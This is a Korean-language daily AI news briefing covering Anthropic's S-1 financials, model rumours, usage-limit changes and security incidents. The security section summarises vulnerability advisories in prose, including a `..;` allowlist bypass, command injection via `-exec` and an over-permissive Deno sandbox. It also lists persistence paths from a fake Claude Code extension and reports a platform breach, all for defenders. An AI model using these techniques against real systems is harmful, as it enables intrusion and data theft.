---
title: "2026-11-03 AI 브리핑"
date: 2026-11-03T01:00:00+09:00
tags: [ai-briefing, anthropic, openai, security, linux]
description: "Anthropic은 S-1 수정본에서 3분기 매출 170억 달러와 약 8,954억 달러의 컴퓨트 약정을 공시하면서 비싼 단기 컴퓨트 때문에 영업적자로 돌아섰다고 밝혔고, RHEL은 CVE-2026-98432 수정 커널을 냈지만 Ubuntu는 아직이며, claude-mem은 설치 화면이 동의 없이 30일치 프롬프트를 올리던 동작을 고쳤다."
---

> 조사 범위: 2026-11-02 01:00 ~ 2026-11-03 01:00 KST(2026-11-01 16:00 ~ 11-02 16:00 UTC, 미국 일요일 08:00 ~ 월요일 08:00 PST). 직전 브리핑(11-02 판)의 조사 창 종료 시각부터 24시간이다. 시각은 SEC EDGAR "Accepted" 시각, 기사 `article:published_time`·JSON-LD `datePublished`, RSS `pubDate`, GitHub `published_at`, 전역 GHSA `published_at`, Red Hat CSAF `initial_release_date`, Hugging Face 커밋 시각, OpenRouter `created`, 트윗 스노우플레이크 ID(fxtwitter), HN Algolia `created_at`으로 검증했다. HN 점수는 조회 시점(11-02 16시대 UTC) 값이다.

## 오늘의 핵심 요약

- **Anthropic이 S-1 수정본에서 컴퓨트 약정 총액을 처음 채웠다.** 약 8,954억 달러이고, 그중 698억 달러를 앞으로 12개월 안에 치러야 한다. 3분기 매출은 170억 달러였지만, 비싼 단기 컴퓨트 50억 달러 때문에 2분기 영업흑자(9.74억 달러)가 3분기 영업적자(5.67억 달러)로 돌아섰다. 같은 주말 공식 Mythos 페이지에는 "Claude Mythos 5.5"가 잠깐 올라왔다가 사라졌다(출시 발표는 없다).
- **정액 상품의 서빙 비용이 표면으로 올라왔다.** OpenAI는 이메일로 ChatGPT와 Codex가 "in the coming weeks" 같은 사용량을 쓰게 된다고 알렸다(도움말은 아직 "12월부터"). Musk는 Grok Bot의 서빙 비용이 매출 대비 "unsustainably high"였다고 썼다.
- **보안:** Red Hat은 11-01에 RHEL 8·9·10의 CVE-2026-98432 수정 커널을 냈다. Ubuntu는 고친 빌드를 -proposed에만 둔 채 아직 내보내지 않았다("WTF Ubuntu?" HN 550점대). Trigger.dev가 일부 조직의 환경 변수 노출을 공개해 AI 개발 플랫폼 침해가 또 늘었다. Claude Code 메모리 플러그인 claude-mem은 설치 화면이 동의 없이 최근 30일 프롬프트 원문을 외부로 올리던 동작을 고쳤다. 이미 올라간 데이터는 지워지지 않는다.

## 모델 소식

미국 일요일 오전부터 월요일 오전까지의 창이었다. 새 프런티어 모델의 공식 발표는 없었다. Hugging Face 주요 조직 41곳의 창 안 신규 모델은 0건이고, OpenRouter 신규 등록은 1건(GLM Legal)이었다. 가장 큰 소식은 Anthropic의 S-1 수정본이다. 출시가 가까워 보이는 흔적도 두 개(Mythos 5.5, GPT-6.2 Astra) 나왔다.

### 1. Anthropic S-1/A: 3분기 매출 170억 달러, 컴퓨트 약정 총액 약 8,954억 달러. 비싼 단기 컴퓨트 때문에 영업적자로 돌아섰다

- **매출과 비용(공시 원문):**
  - 매출: "$17.0 billion for the three months ended September 30, 2026". 전년 동기는 14억 달러였다. 원문: "revenue that grew 1,127% year over year … compared to compute and infrastructure expenses that grew 382% during the same period."
  - CNBC 계산으로는 전 분기 대비 성장률이 약 47%다. 2분기 144%, 1분기 132%에서 크게 꺾였다.
  - 9개월 컴퓨트·인프라 비용은 188억 달러(전년 대비 +329%)다.
- **영업적자 전환(원문):** "Our operating loss was $567 million for the three months ended September 30, 2026, compared to an operating income of $974 million for the three months ended June 30, 2026, primarily driven by $5.0 billion of compute under short-term commitments, which currently costs significantly more than comparable compute procured under our multi-year commitments, and $2.0 billion of non-cash charges related to our donation matching program."
  - 10-27 판에서 "첫 영업흑자"로 다룬 2분기 숫자가 한 분기 만에 뒤집혔다.
  - 회사 기준 조정 영업이익은 25억 달러(2분기 22억 달러)로 늘었지만, 조정 영업이익률은 19%에서 15%로 내려갔다.
  - 3분기 순손실은 232.9억 달러다. 그중 219억 달러가 전환사채 등의 공정가치 변동이다.
- **컴퓨트 약정 총액(원문):** "an aggregate committed spend of approximately $895.4 billion, substantially all of which is related to compute and infrastructure." 약 4,475억 달러는 2030년 말 전에, 나머지 대부분은 2031~2045년에 쓴다. 원문: "Approximately $69.8 billion of these commitments are due in the 12 months following September 30, 2026."
  - 10-26 원 S-1에서는 같은 문장의 금액이 비어 있었다("more than $ ,"). 10-27 판은 상대별 약정(Google·Amazon·SpaceXAI·Microsoft)만 실었다.
- **그 밖에:** 직원은 약 5,300명(9-30 기준)이다. 공모가 범위는 여전히 비어 있고("between $ and $"), 티커는 "ANT"다. 구독 상품 표기가 "Claude Pro, Max, and Ultra plans"로 바뀌어 직전 판의 요금제 개편이 반영됐다.

중요한 이유: Anthropic은 영업적자의 원인으로 "지금 사는 단기 컴퓨트가 장기 약정보다 훨씬 비싸다"는 점을 직접 적었다. 앞으로 12개월 안에 치를 약정(698억 달러)이 3분기 매출의 4배를 넘는다. 직전 판에서 다룬 Ultra 개편과 주간 한도 유지, 이번 주의 OpenAI·xAI 사용량 정책(3·4번)은 모두 이 비용 구조와 맞닿아 있다.

[SEC S-1/A](https://www.sec.gov/Archives/edgar/data/2130357/000162828026068676/anthropicpbc-sx1ax1.htm) (공식, EDGAR 접수 11-02 09:24:24 EST = 14:24 UTC) · [EDGAR 인덱스](https://www.sec.gov/Archives/edgar/data/2130357/000162828026068676/0001628280-26-068676-index.htm) · [CNBC](https://www.cnbc.com/2026/11/02/anthropic-ant-s-1-quarter-financials.html) (14:32 UTC) · [HN](https://news.ycombinator.com/item?id=50337439) (122점)

### 2. Anthropic 공식 Mythos 페이지에 "Claude Mythos 5.5"가 잠깐 올라왔다가 사라졌다 (출시 발표 없음)

- **무엇이 있었나(Wayback 원문 대조):**
  - 10-31 21:49 UTC 스냅샷에서는 `anthropic.com/claude/mythos`의 숨은 h1과 로고 alt 텍스트가 "Claude Claude Mythos 5.5"였다(HTML에 6번).
  - 11-01 20:05 UTC 스냅샷에서는 모두 "Mythos 5.1"로 돌아갔다. 조회 시점 페이지도 5.1이다.
- **커뮤니티 정황:** TestingCatalog(11-01 20:45 UTC)는 Fable 5.5 체크포인트가 일부 사용자에게 A/B 테스트되고 있다는 보고를 함께 정리했다. 원문: "these comparisons remain anecdotal, with no public benchmarks available to support them." 첫 트윗은 11-01 15:31 UTC로 창 시작 29분 전이다.
- **같은 날 별개 사건:** HF에 올라온 "Mythos급 Anthropic 체크포인트 유출"은 가짜로 판정됐다(기술 10번).

중요한 이유: 공식 사이트에 흔적이 남았다가 지워졌다는 점에서 출시가 가깝다는 신호로 읽힌다. Mythos 5.1처럼 검증된 사이버·생명과학 기관에 먼저 풀릴지는 확인되지 않았다. Anthropic의 발표는 없다.

[Wayback 10-31(5.5)](https://web.archive.org/web/20261031214926/https://www.anthropic.com/claude/mythos) · [Wayback 11-01(5.1)](https://web.archive.org/web/20261101200545/https://www.anthropic.com/claude/mythos) · [TestingCatalog](https://www.testingcatalog.com/anthropic-prepares-to-release-claude-mythos-5-5-model/) (커뮤니티, 미확인)

### 3. (후속) OpenAI: Chat·Work 탭을 합친다는 이메일이 나왔다. 사용량 공유 시점은 "in the coming weeks"로 적혔다

- **이메일 원문(사용자가 HN에 전문을 올렸다, 11-02 02:16 UTC):**
  - "In the coming weeks, we’ll start testing a combined experience for Chat and Work tabs in ChatGPT with a small group of users."
  - "Codex will remain a separate experience in the ChatGPT desktop app."
  - "your use of ChatGPT and Codex will draw from the same allowance in the coming weeks"
  - "Unlimited Instant is included in your plan and will not draw from your usage."
- **도움말과 다른 점:** 직전 판 모델 1번의 도움말은 조회 시점에도 "Starting in December"다. 이메일 표현대로라면 사용량 공유가 12월보다 일찍 시작될 수 있다.
- **TechCrunch(13:57 UTC):** "based on usage and model, some folks might need to wait for resets more frequently." Anthropic은 9월에 Claude의 채팅과 Cowork를 한 화면으로 합쳤다고 덧붙였다.

중요한 이유: 직전 판의 토큰 통합 요금제가 UI 통합과 함께 단계적으로 들어온다. Codex는 데스크톱 앱에서 따로 남지만 예산은 같이 쓴다. Codex를 많이 돌리는 사용자는 시행 시점을 12월로 잡지 말고 Settings → Usage를 미리 확인하는 편이 낫다.

[TechCrunch](https://techcrunch.com/2026/11/02/openai-is-finally-merging-chatgpts-chat-and-work-tabs/) (매체보도) · [HN 이메일 전문](https://news.ycombinator.com/item?id=50332302) · 관련 글 "I Am the Reason OpenAI Is Killing Unlimited Chats" [HN](https://news.ycombinator.com/item?id=50327416) (82점)

### 4. Grok Bot 사용 한도: Musk가 "The cost of serving Grok Bot was unsustainably high relative to revenue"라고 썼다

- **무엇이 있었나:** 주간 한도가 며칠 일찍 바닥났다는 사용자 항의에 Musk가 X에서 답했다(11-01 20:34 UTC). TNW에 따르면 비용 수치는 밝히지 않았고, 한도를 실제로 줄였는지도 말하지 않았다.
- **배경(TNW):** Grok Bot은 SpaceX가 8월에 낸 에이전트로, 가상 컴퓨터로 쇼핑 같은 작업을 한다. 요금제는 월 최대 200달러다. 같은 시기 결제·사용량 대시보드 장애가 있었는데, TNW는 그것이 사용량이 튄 원인인지는 분명하지 않다고 적었다.

중요한 이유: OpenAI의 토큰 통합, Anthropic의 주간 한도 유지에 이어 세 번째 회사가 정액 에이전트 상품의 서빙 비용을 공개적으로 문제 삼았다. 1번의 Anthropic 공시와 같은 흐름이다.

[Musk 게시물](https://x.com/elonmusk/status/2116992258520064397) (본인 게시) · [TNW](https://thenextweb.com/news/grok-bot-costs-unsustainably-high-musk-usage-limits) (14:46 UTC) · [Business Insider](https://www.businessinsider.com/grok-bot-usage-limits-costs-unsustainably-high-elon-musk-agents-2026-11)

### 5. SemiAnalysis GDPx: 1위 Opus 5.5도 12.0%에 그쳤고, 아직 일반 공개 전인 Gemini 4 Carbon이 2위였다

- **무엇이 나왔나:** 11개 도메인, 데이터 파트너 14곳, 과제 206개로 만든 에이전트 벤치마크다. 각 모델의 네이티브 하네스(Claude Code, Codex, Antigravity 등)로 돌리고, 없으면 OpenCode를 쓴다. 원문: "we report pass@1 across three attempts."
- **리더보드(조회 시점):** Claude Opus 5.5 12.0%(과제당 $51.41), Gemini 4 Carbon 10.9%($16.29), GPT-6 Astra 9.6%($53.99), Muse Wonder Full 9.0%.
- **원문 단서:**
  - "certain models like Opus 5.5 and GPT-6 Astra have sandbagged overall scores due to their safety classifiers"
  - "Muse Wonder Full is actually the best available cyber model today by a meaningful margin"
  - "Our finance and legal tasks are so challenging that basically every model scores exactly 0."

중요한 이유: 안전 분류기가 사이버·바이오 과제 점수를 깎는다는 점을 제3자가 수치로 보였다. 모델을 고를 때 범용 점수보다 도메인별 거부 동작이 더 중요할 수 있다는 뜻이다. 같은 점수대에서 Carbon의 과제당 비용이 Opus 5.5의 약 3분의 1인 것도 눈에 띈다. 모두 SemiAnalysis 자체 측정이다.

[SemiAnalysis](https://newsletter.semianalysis.com/p/gdpx-measuring-frontier-model-capabilities) (11-02 01:51 UTC, 본문 일부 유료) · [GDPx 리더보드](https://gdpx.semianalysis.com) (매체, 제3자 측정)

### 6. (후속) Mistral Large 4 기술 보고서: KV 캐시를 끝까지 줄였더니 에이전트 성능이 떨어져 "모델 수술"로 되돌렸다

- **원문:** "we pushed KV-cache reduction to the limit during development, but later found it underperformed on downstream agentic tasks. We quantified this agentic penalty and addressed it through model surgery, converting our model to full attention, then DeepSeek Sparse Attention (DSA)". DSA는 쿼리마다 상위 2,048개 키 토큰을 고른다.
- **수치(자사 측정):** FrontierCode 2.0 19.7%, Terminal-Bench 4.0 41%, Artificial Analysis Cyber Index 50.9%다. NVFP4 양자화로 체크포인트를 606GB로 줄여 GB300 4장에 올린다.
- **자사 표의 비교:** AA-Briefcase에서 Mistral Large 4는 42.5%로, DeepSeek V4.1-Flash 1017(53.5%), GLM-5.3(51.0%), Kimi K3(50.0%)보다 낮다.

중요한 이유: 서빙 비용을 줄이려는 KV 캐시 압축이 긴 에이전트 작업에서 대가를 치른다는 설계 교훈이 수치와 함께 공개됐다. 10-30 판에서 가중치를 다룬 모델의 후속이다.

[기술 보고서 PDF](https://huggingface.co/mistralai/Mistral-Large-4-1T-A52B/blob/main/assets/technical_report.pdf) (공식, HF 커밋 11-02 15:50 UTC로 창 종료 9분 전) · [HF 커밋](https://huggingface.co/mistralai/Mistral-Large-4-1T-A52B/commit/eb92e221eb3ca49a6e722f58aebcf10d346be70d)

### 7. (미확인) "gpt-6.2-astra"가 Codex 사용량 화면에 나타났다

- **TestingCatalog(11-02 11:14 UTC):** Codex 사용량 분석 화면의 10-31 막대에 `gpt-6.2-astra`가 보였고, 응답 이벤트의 model 필드에 같은 값이 찍힌 화면도 돌았다. 원문: "That's strong evidence the ID is live on OpenAI's servers, but it isn't an announcement."
- **반증 쪽:** 조회 시점 OpenAI 모델 문서에는 GPT-6 Astra, GPT-6.1 Sol, GPT-6 Luna만 있다.

[TestingCatalog](https://www.testingcatalog.com/gpt-6-2-astra-appears-codex-usage/) (커뮤니티, 미확인)

### 8. 장애

- OpenAI·Claude·Google Cloud 상태 페이지에 창 안 인시던트가 없었다. Grok Bot의 사용량 대시보드 문제는 4번에 적었다.

### 9. 짧게

- **OpenAI Grid Protectors Program(공식, 11-02):** 앞으로 지을 캠퍼스가 전력망이 빠듯할 때 수요를 줄이는 협약을 전력회사와 맺는다. 조지아 Effingham 캠퍼스가 첫 사례다. 원문: Georgia Power와의 계약에 "up to 1,000 megawatts of flexible demand response"가 들어 있다. [OpenAI](https://openai.com/index/grid-protectors-program)
- **OpenAI 아부다비 계약(CNBC 11-02 11:02 UTC):** ADNOC·G42와 프런티어 기술을 ADNOC 운영에 배치하는 계약을, Mubadala·Inception42와 투자 분석 협약을 맺었다. 자금 라운드는 여전히 "seeking to raise up to $20 billion"이라 직전 판 이후 새 숫자는 없다. [CNBC](https://www.cnbc.com/2026/11/02/openai-abu-dhabi-ai-deals.html)
- **Altman 방한(CNBC 11-02 02:58 UTC):** 토요일에 삼성 계열사 경영진 약 50명을 만났다(삼성 발표). 한국 매체는 SK 최태원 회장과도 만났다고 보도했다. [CNBC](https://www.cnbc.com/2026/11/02/openai-sam-altman-samsung-sk-south-korea.html)
- **한국 2027년 예산(CNBC 11-02 06:02 UTC):** 원문: "A separate 4.7 trillion won will go toward developing a sovereign AI model with what Lee described as the 'world's highest performance.'" 반도체·피지컬 AI·AI 데이터센터에는 21.3조 원이다. [CNBC](https://www.cnbc.com/2026/11/02/south-korea-ai-spending-budget.html)
- **Z.ai GLM-5.3-FlashX-Legal이 OpenRouter에 등록됐다(11-02 13:29 UTC):** 법률 작업에 맞춘 모델이다. 100만 토큰당 입력 $0.37, 출력 $1.25다. 모델 자체는 10월부터 Z.ai 문서에 있었으므로 창 안의 일은 OpenRouter 등록이다. [OpenRouter](https://openrouter.ai/z-ai/glm-5.3-flashx-legal)
- **(창 경계) xAI(SpaceXSI)도 텍스트 워터마크를 넣는다:** 원문: "Starting November 7, 2026, responses from these models include a watermark." 대상은 grok-4.7부터 grok-4.3, grok-4.20 계열이다. 직전 판 모델 6번의 Anthropic과 달리 "Team admins can turn watermarking off for some or all models"다. 탐지 API는 신청한 곳에만 연다. 문서 날짜가 10-31이라 직전 창이지만 직전 판이 다루지 않았다. [문서](https://docs.x.ai/developers/advanced-api-usage/watermarking) (공식)
- **(창 경계) GPT-Rosalind-6 시스템 카드(10-30 게시):** 직전 판 모델 4번은 출시만 다뤘다. 원문: "we are treating this launch as High capability in the Biological and Chemical domain, below the threshold for Critical", 그리고 "treat GPT-Rosalind-6 as Critical in Cybersecurity". 또 "Rosalind has fewer refusals on dual-use biological queries but is only made available via trusted access." [시스템 카드](https://deploymentsafety.openai.com/gpt-rosalind-6) (공식)
- **직전 판 후속 중 새 진전 없음:** Anthropic Max/Ultra(도움말 갱신 없음), Daybreak Blue 별도 거부 옵션(도움말 문구 그대로), Opus 4.8 fast mode(릴리스 노트 최신이 10-30), Apple Intelligence 중국 Qwen(11-04 베타 예정 그대로).
- **공식 채널 새 진전 없음:** OpenAI API·ChatGPT·Codex 변경 로그, Anthropic 플랫폼 릴리스 노트, Gemini API 변경 로그(10-30), Mistral, DeepSeek, Alibaba 뉴스룸, Z.ai, Microsoft AI.

## 기술 이슈

일요일 창이라 연구 쪽은 조용했다(HF Daily Papers 11-01은 0편). 대신 직전 판 보안 항목들의 후속이 많았다. 전역 GHSA는 reviewed 0건(검토 파이프라인이 10-30 이후 멈춤), unreviewed 239건, malware 32건이었고, 주요 AI 저장소 약 170곳의 저장소 권고는 창 안에 1건뿐이었다.

### 1. (후속) Linux CVE-2026-98432: RHEL 8·9·10은 11-01에 수정 커널이 나왔다. Ubuntu는 고친 빌드를 -proposed에만 두고 있다

- **Red Hat(CSAF 원문 대조):** 네 권고 모두 이 CVE를 포함한다.

  | 권고 | 대상 | 게시(UTC) | 등급 |
  |---|---|---|---|
  | RHSA-2026:93415 | RHEL 8 kernel-rt | 11-01 20:52 | Critical |
  | RHSA-2026:93414 | RHEL 8 kernel | 11-01 21:39 | Critical |
  | RHSA-2026:93412 | RHEL 9 kernel (CVE 18건 묶음) | 11-01 22:09 | Important |
  | RHSA-2026:93413 | RHEL 10 kernel (CVE 16건 묶음) | 11-01 22:16 | Important |

  RHEL 9·10 권고는 묶음 등급이 Important로 표시되지만 이 CVE가 들어 있다. Red Hat 보안 데이터는 RHEL 9 kernel-rt 등 일부 제품을 아직 "Affected"로 둔다.
- **Ubuntu(추적기 JSON, 마지막 갱신 10-30 19:44 UTC):** 22.04·24.04와 그 이후 릴리스는 여전히 "pending"이고, 16.04·18.04·20.04는 "needed"다. 보안 공지(USN)는 없다. Launchpad 기준 수정 빌드는 10-26부터 -proposed에만 있다.
- **"WTF Ubuntu?"(HN 550점대, 11-02 14:52 UTC):** 원문: "Debian patched it on October 16. Ubuntu still doesn't have a patch more than two weeks later." 글쓴이는 서버를 Ubuntu에서 옮기겠다고 했다.
- **그 밖에:** Northflank는 11-02 상태 페이지 갱신에서 원문: "we have patched CVE-2026-98432 across our fleet"라고 썼다(침해 경로라고 밝힌 것은 아니다). Atlas는 11-02 갱신에서 이 CVE를 언급하는 GitHub 저장소 41개 중 최소 7개가 레이스 트리거나 PoC를 담았다고 주장했다(미검증). CISA KEV에는 아직 없다.

중요한 이유: 직전 판에서 "Ubuntu와 RHEL은 아직 수정 커널이 없다"고 적은 두 배포판 중 RHEL은 이제 업데이트하면 된다. Ubuntu 서버는 여전히 직전 판의 nftables 완화나 -proposed 커널에 기대야 한다. 공개 PoC를 표방하는 저장소가 늘고 있어 남은 기간이 짧다. 6번의 Trail of Bits 글이 이 지연의 구조적 배경을 다룬다.

[WTF Ubuntu?](https://chalmovsky.com/posts/wtf-ubuntu) (커뮤니티) · [Red Hat CVE](https://access.redhat.com/security/cve/cve-2026-98432) · [RHSA-2026:93414 CSAF](https://security.access.redhat.com/data/csaf/v2/advisories/2026/rhsa-2026_93414.json) (공식) · [Ubuntu 추적기](https://ubuntu.com/security/CVE-2026-98432) · [Atlas](https://atlasum.net/blog/cve-2026-98432-linux-ipv4-tcp-uaf) · [HN](https://news.ycombinator.com/item?id=50337608) (553점)

### 2. (Black October 후속) Trigger.dev가 일부 조직의 환경 변수 노출을 공개했다. Northflank는 "1시간 안에 차단했다"고 밝혔다

- **Trigger.dev(AI 에이전트·백그라운드 작업 플랫폼, 11-01 22:33 UTC):** 원문: "We've blocked the exploit used in this attack, but our investigation has identified exposure across a subset of organizations. The attacker gained unauthorized access to environment variables for these organizations." 영향받은 계정 소유자에게는 메일을 보냈다. 침해 경로, 피해 조직 수, AI 키 악용 여부는 밝히지 않았다. HN에서는 경로를 공개하지 않은 채 상태 페이지를 "Resolved"로 표시한 데 대한 비판이 나왔다.
- **Northflank 상태 페이지 갱신(11-02):**
  - "We believe the attack vector was contained within an hour of the first alert."
  - 외부 포렌식 감사가 주말부터 진행 중이다. 원문: "Evidence suggests it was focused on secrets held in our control plane." 실행 중인 워크로드는 영향이 없었다고 했다. RCA는 아직 없다.
- **연결 여부:** Wiz "Black October" 글은 10-30 이후 갱신이 없다. Trigger.dev를 같은 캠페인으로 묶은 공식 근거도 아직 없다.

중요한 이유: 직전 판에서 정리한 9곳에 이어, 환경 변수에 비밀을 모아 두는 개발 플랫폼의 공개가 또 나왔다. 그 키가 30분 안에 시험 호출을 받는 시장이 이미 돌고 있다는 점은 직전 판 1번에 적었다. Trigger.dev에 AI 공급자 키를 둔 팀은 경로 공개를 기다리지 말고 키를 교체하고, 공급자 쪽 사용 로그를 확인한다.

[Trigger.dev 공지](https://trigger.dev/blog/security-incident-nov-2026) (공식) · [Trigger.dev 상태 페이지](https://status.trigger.dev/incident/1110434) · [Northflank 상태 페이지](https://status.northflank.com/incident/cmvv0rn5a092f14rutwccodpp) (공식) · [HN](https://news.ycombinator.com/item?id=50331784) (150점)

### 3. MCP·에이전트 인프라 취약점: FastMCP Generative UI의 샌드박스가 서버 파일 시스템을 열어 줬다 (critical). Chainlit·CSGHub·PandaWiki는 미수정

모두 전역 GHSA unreviewed(NVD발)로 창 안에 게시됐다. 수정 상태는 조회 시점 기준이다.

| 대상 | 내용 | 수정 상태 | 권고 (UTC 게시) |
|---|---|---|---|
| **PrefectHQ prefab-ui 0.14.0~0.20.2** (critical) | Generative UI 샌드박스가 Deno를 `--allow-read`·`--allow-write`·`--allow-net`으로 띄워, LLM이 쓴 Python이 Pyodide를 거쳐 서버 파일을 읽고 쓰고 `.pth`로 지속 실행까지 한다. 원격 경로는 FastMCP의 `generate_prefab_ui` 도구다. 원문: "On a FastMCP server with no authentication configured, any client who can reach the server can call the tool." Generative UI는 opt-in이고 Deno가 있어야 한다 | 0.21.0(10-26)에서 수정 | [GHSA-3g72-rrqc-f76c](https://github.com/advisories/GHSA-3g72-rrqc-f76c) (11-01 18:30) |
| **Chainlit 2.12.0** (medium) | MCP URL 검사가 `;`를 거르지 않아, `..;` 경로로 `allowed_urls` 제한을 무인증 우회해 SSRF가 된다 | **미수정**(PyPI 최신 2.12.0) | [GHSA-xhx7-9vjr-p2h8](https://github.com/advisories/GHSA-xhx7-9vjr-p2h8) (11-02 15:31) |
| **OpenCSG CSGHub v2.6.0-ce까지** (high) | 무인증 파일 조회 경로에서 서버 API 키로 대신 요청해, 비공개 모델·코드 파일을 읽을 수 있다 | **미수정** | [GHSA-p8qg-p5c7-m59c](https://github.com/advisories/GHSA-p8qg-p5c7-m59c) (11-02 15:31) |
| **PandaWiki 3.65.0~3.87.5** (medium, AI 지식베이스) | 업로드 HTML로 저장형 XSS가 생겨 관리자 토큰을 탈취할 수 있다 | **미수정**(최신 3.87.5) | [GHSA-7h72-q9rr-77j7](https://github.com/advisories/GHSA-7h72-q9rr-77j7) (11-02 15:31) |
| LobeHub Chat 1.84.26~2.1.49 미만 (high) | 파일명 경로 조작으로 서버 파일을 덮어써 코드를 실행한다 | 2.1.49에서 수정 | [GHSA-7925-2fm7-xg83](https://github.com/advisories/GHSA-7925-2fm7-xg83) (11-02 03:30) |
| MiniMax Code 0.5.8 (medium) | Find 핸들러의 `-exec`로 OS 명령을 주입한다. 벤더가 응답하지 않았다 | 미확인 | [GHSA-p8vc-6wf8-q86x](https://github.com/advisories/GHSA-p8vc-6wf8-q86x) (11-02 00:30) |

- **직전 판 미수정 항목:** LMDeploy 수정 PR #4964는 여전히 열려 있고(최신 v0.18.0), Flowise(3.1.4), fickling(0.1.12), ramparts(0.8.10)도 새 릴리스가 없다.

중요한 이유: "LLM이 쓴 코드를 격리한다"던 샌드박스가 기본 권한 설정 때문에 서버 파일 시스템을 그대로 열어 줬다. 인증 없이 띄운 FastMCP 서버라면 도구 호출 하나로 서버에 코드를 심을 수 있다. Generative UI를 켰다면 prefab-ui를 0.21.0 이상으로 올렸는지 잠금 파일에서 확인한다(도구 7번 FastMCP 4.1.5와는 별개다).

### 4. (정정) Claude의 게임 재현 거부: Anthropic 쪽 설명은 10-30에 이미 나와 있었다

- **직전 판의 잘못:** 기술 5번에서 "Anthropic의 공식 입장은 조회 시점까지 없다"고 적었다. 실제로는 Claude Code 팀의 Addy Osmani가 10-30 16:58 UTC에 설명을 올렸다(직전 창 안).
- **원문:** "We added two sentences to Claude Code's prompt on Opus 5.5 to steer it away from recreating someone else's specific game because using Claude to infringe IP is against our usage policy. Original games, genre games, and games built from your own designs and assets are meant to keep working." 잘못 거부된 사례는 자신에게 보내 달라고 했다.
- **매체:** Game Developer는 기사 상단에 "Update: Anthropic has confirmed it's released an update to Opus 5.5 to "steer" Claude Code away from "recreating someone else's specific game.""를 붙였다(JSON-LD 갱신 10-31 16:24 UTC).
- **여전히 설명이 없는 것:** 리버스 엔지니어링 거부와 "학습 관련 작업 차단" 주장이다. 창 안에도 Claude Code 저장소에 거부 관련 이슈가 이어졌고, 직원 답변은 아직 없다.

[Osmani 게시물](https://x.com/addyosmani/status/2116213240363729013) (직원 게시, 10-30 16:58 UTC) · [Game Developer](https://www.gamedeveloper.com/programming/anthropic-appears-to-have-ordered-ai-tool-claude-to-stop-remaking-video-games)

### 5. (후속·창 경계) Cursor 가짜 Claude Code 확장: Microsoft 분석에 따르면 Linux에서도 지속성을 시도했다

- **Microsoft Security 블로그(10-31 01:02 UTC 게시, 11-01 02:40 UTC 수정):** 직전 판 창 안이었지만 다루지 않았다.
  - 배포 경로: 원문: "the malicious packages found on Cursor marketplace were never published nor distributed from Microsoft Visual Studio Marketplace and from npm @anthropic-ai/claude-code". "Anthropic confirmed to Microsoft that their systems were not compromised and they did not develop the malicious package".
  - 지속성: macOS는 `~/Library/LaunchAgents/com.apple.sysmond.plist`, **Linux는 user-crontab `@reboot` 항목**, Windows는 예약 작업이나 Startup 폴더의 `sysmon.cmd`다. 관련 파일은 `~/.config/.smt`, `~/.config/.smtk`다.
  - 권고: Cursor에서 확장을 승인된 게시자로 제한하고 "extension installation cooldown"을 설정한다.
- **SecurityWeek(11-02 11:29 UTC):** Kevin Beaumont를 인용해 약 5,000대가 내려받았을 수 있다고 적었다. Cursor 공지에서 삭제된 수치와 같다. Beaumont 원문은 확인하지 못했다.

중요한 이유: Cursor 공지는 Windows·macOS 버전만 적었다. Linux 개발 머신에서 Cursor를 쓰고 해당 기간에 확장을 설치·업데이트했다면 `crontab -l`에서 `.smt`를 부르는 `@reboot` 항목과 `~/.ssh/authorized_keys`의 낯선 키를 확인한다.

[Microsoft](https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/) (벤더 리서치) · [SecurityWeek](https://www.securityweek.com/malicious-claude-code-extension-served-in-cursor-supply-chain-attack/) (매체보도)

### 6. Trail of Bits: Codex로 안정판 커널에 빠진 CVE 수정 149건을 넣었다

- **원문:** "By October 29, our project helped deliver fixes for 149 distinct CVEs into stable Linux kernel releases, and several fixes to Fedora and Ubuntu packages." 수정을 찾고 옮기는 데 "Codex with GPT-5.6"을 썼다.
- **사람의 시간:** 원문: "preparing and reviewing a straightforward backport takes about 30 minutes of human attention; a more involved case can take around three hours."
- **안정판 브랜치의 미수정 CVE(원문 표):** 5.10.y 2,006건(55.8%), 5.15.y 1,889건, 6.1.y 1,329건, 6.6.y 1,012건, 6.12.y 686건, 6.18.y 337건.

중요한 이유: 1번처럼 수정이 나와도 배포판까지 내려오는 데 몇 주가 걸리는 이유가 백포트 인력이라는 점, 그리고 에이전트로 그 비용을 줄일 수 있다는 실측이다. 수치는 Trail of Bits 자체 측정이다.

[Trail of Bits](https://blog.trailofbits.com/2026/11/02/backporting-security-fixes-at-scale-with-codex/) (벤더 리서치, 11-02 12:00 UTC) · [HN](https://news.ycombinator.com/item?id=50336405) (14점)

### 7. "수학은 바뀌었다": Calegari가 OpenAI 논문 700여 편을 분수령이라 부르면서, 품질과 출처 표기를 비판했다 (HN 360점대)

- **Terence Tao 블로그 기고(11-01 18:28 UTC):**
  - "The release by OpenAI on October 6 of over 700 research papers was a watershed in the history of mathematics."
  - "The OpenAI papers — despite some tremendous ideas — are atrociously written and violate our community expectations of attribution. Some of them are even wrong."
  - 제안: "We should be producing fewer (and better) papers, not more." 자율 AI 증명은 "hopefully Lean-checked" 형태로 기록하자고 했다.

중요한 이유: 10-08 판에서 다룬 OpenAI 수학 원고 공개에 대해 수학계 안에서 나온 정리된 응답이다. AI의 기여를 인정하되, 논문 수를 늘리는 대신 검증(Lean)과 출처 표기를 기준으로 삼자는 쪽이다.

[Tao 블로그](https://terrytao.wordpress.com/2026/11/01/mathematics-has-changed-lets-act-like-it/) (전문가 기고) · [HN](https://news.ycombinator.com/item?id=50328251) (361점)

### 8. 개발 문화 논쟁 2건: Proton의 AI 선언문과 OccupySaaS

- **Proton "AI manifesto for software engineering"(11-01 22:10 UTC):**
  - "Your job is to help the LLM write better code faster."
  - "(yes, we need to and will get to a point where most human code review will end)"
  - 배경은 404 Media의 10-29 보도다. 출시 전 펜테스트를 하자는 엔지니어 요청에 CEO가 "loser thinking"이라고 답했다는 내용이다. 반박 글 "It wasn't AI that flipped Proton's charge"가 HN에서 160점대를 받았다.
- **OccupySaaS(HN 440점대, 11-02 00:17 UTC):** 해고된 엔지니어들이 공개 문서와 AI로 SaaS의 clean-room 오픈소스 대체품을 만드는 운동이다. 원문: "We don't leak, decompile or copy anyone's code." 첫 결과물은 Auth0 호환 ZeroAuthy와 Salesforce 호환 SalesCompel이다(Apache-2.0).

중요한 이유: 사람의 코드 리뷰를 줄이겠다는 회사 선언과, AI로 남의 제품을 호환 재구현하겠다는 운동이 같은 날 크게 번졌다. 4번의 "특정 게임 재현 금지"와 함께, AI로 무엇을 다시 만들어도 되는가라는 질문이 여러 방향에서 나오고 있다.

